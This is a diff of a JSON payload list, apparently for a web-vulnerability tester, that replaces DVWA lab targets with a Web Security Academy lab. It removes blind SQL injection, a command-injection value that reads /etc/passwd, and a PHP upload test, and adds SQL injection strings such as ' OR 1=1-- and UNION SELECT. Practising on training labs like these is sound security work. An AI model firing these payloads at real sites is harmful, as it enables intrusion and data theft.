@@ -1,20 +1,12 @@
 [
   {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit",
+    "url": "https://0a5c001d042ad831802c9ada009c00f2.web-security-academy.net/filter",
     "method": "GET",
-    "param": "id",
-    "values": ["1' AND '1'='1", "1' AND '1'='2"]
-  },
-  {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/exec/",
-    "method": "POST",
-    "param": "ip",
-    "values": ["127.0.0.1; cat /etc/passwd"]
-  },
-  {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/upload/",
-    "method": "POST",
-    "param": "uploaded",
-    "values": ["test.php"]
+    "param": "category",
+    "values": [
+      "' OR 1=1--",
+      "' OR 1=0--",
+      "' UNION SELECT NULL--"
+    ]
   }
 ]
